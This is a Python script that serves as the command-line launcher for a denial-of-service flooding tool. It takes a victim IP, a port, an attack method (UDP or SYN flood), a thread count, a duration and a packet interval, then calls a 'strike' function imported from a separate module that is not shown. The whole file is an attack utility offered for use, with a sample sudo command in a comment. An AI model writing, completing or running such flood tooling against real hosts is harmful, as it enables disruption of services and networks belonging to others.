import optparse, asyncio
from savitr.zeus import strike

#sudo python3 main.py -v 127.0.0.1 -d 80 -m UDP -t 60 -p 3

usage = """\n\n

Example: -v 127.0.0.1 -d 80 -m udp -t 10 -p 6 -s .4  (Does not need to be in order)

Options: (everything but victim has a default value if not given one)
 ______________________________________________________________
|                                                              |
|-v, --victim      | The IP address.                           |
|-d, --destination | The targeted Port number.                 |
|-m, --method      | The attack Method.                        |
|-p, --processes   | The Thread count.                         |
|-t, --time        | The attack Time length in second(s).      |
|-s, --sleep       | The time between each packet in second(s).|
|______________________________________________________________|
 """

parser = optparse.OptionParser(description="User options", usage=usage)
parser.add_option(

        '-v',
        '--victim',
        action='store',
        dest='harg',
        type=str,
        help='The host IP address.'
    )
parser.add_option(

        '-d',
        '--destination',
        action='store',
        dest='darg',
        type=int,
        default=80,
        help='The host Port number.'
    )
parser.add_option(

        '-m',
        '--method',
        action='store',
        dest='marg',
        type=str,
        default='udp',
        help='The attack Method.'
    )
parser.add_option(

        '-p',
        '--processes',
        action='store',
        dest='parg',
        type=int,
        default=3,
        help='The Thread count.'
    )
parser.add_option(

        '-t',
        '--time',
        action='store',
        dest='targ',
        type=int,
        default=5,
        help='The attack Time.'
    )

parser.add_option(

    '-s',
    '--sleep',
    action='store',
    dest='sarg',
    type=float,
    default=.4,
    help='time between each packet sent in second(s).'
)

NULLVALUE = False

try:
    (options, args) = parser.parse_args()
except optparse.OptParseError as e:

    print ('\n[!!]\tUnable to parse arguments.')
    raise SystemExit

ARGUMENT_DIC = {

    'victim/IP address': options.harg,
    'destination/Port': options.darg,
    'method/UDP,SYN': options.marg,
    'threads': options.parg, #  -p/--processes
    'time/Seconds': options.targ,
    'sleep': options.sarg
}


usr_opt = """\n\n
Victim  | {victim/IP address}
Port    | {destination/Port}
Method  | {method/UDP,SYN}
Threads | {threads}
Time    | {time/Seconds}
Sleep   | {sleep}
""".format(**ARGUMENT_DIC)



def main():

    print (usr_opt); input("\nPRESS ENTER TO CONTINUE. (Ctrl+z to exit)")

    loop = asyncio.get_event_loop()

    loop.run_until_complete(strike(**ARGUMENT_DIC))
    loop.close()





if __name__ == '__main__':
    'execute'
    main()
